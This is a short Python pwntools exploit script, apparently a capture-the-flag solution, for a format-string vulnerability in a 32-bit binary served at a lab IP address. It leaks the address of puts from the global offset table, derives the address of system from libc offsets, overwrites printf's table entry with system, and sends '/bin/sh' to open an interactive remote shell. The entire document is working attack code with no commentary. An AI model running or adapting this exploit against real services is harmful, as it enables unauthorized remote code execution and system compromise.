from pwn import * 
context.log_level = 'debug'
target = remote('192.168.5.131',9999)

libc = ELF('/lib32/libc.so.6')
elf =ELF('/home/star/Desktop/pwn')

got_puts = elf.got['puts']
print type(got_puts)
payload = ''
payload += p32(got_puts)
payload += '%6$s'
#print repr(payload)
target.recvuntil('Do you know repeater?')
target.recvuntil('\n')
target.sendline(payload)
puts_addr = target.recv()[4:8] # the first 4 bytes for repter '%6$s'
log.success(hex(u32(puts_addr)))
system_addr = u32(puts_addr) - (libc.symbols['puts'] - libc.symbols['system'])
#log.success(hex(system_addr))
got_prt = elf.got['printf']
#print hex(got_prt)
payload2 = ''
payload2 = fmtstr_payload(6,{got_prt:system_addr})
#target.recvuntil('\n')
target.sendline(payload2)
#target.recvuntil('\n')
target.sendline('/bin/sh\x00')
target.interactive()
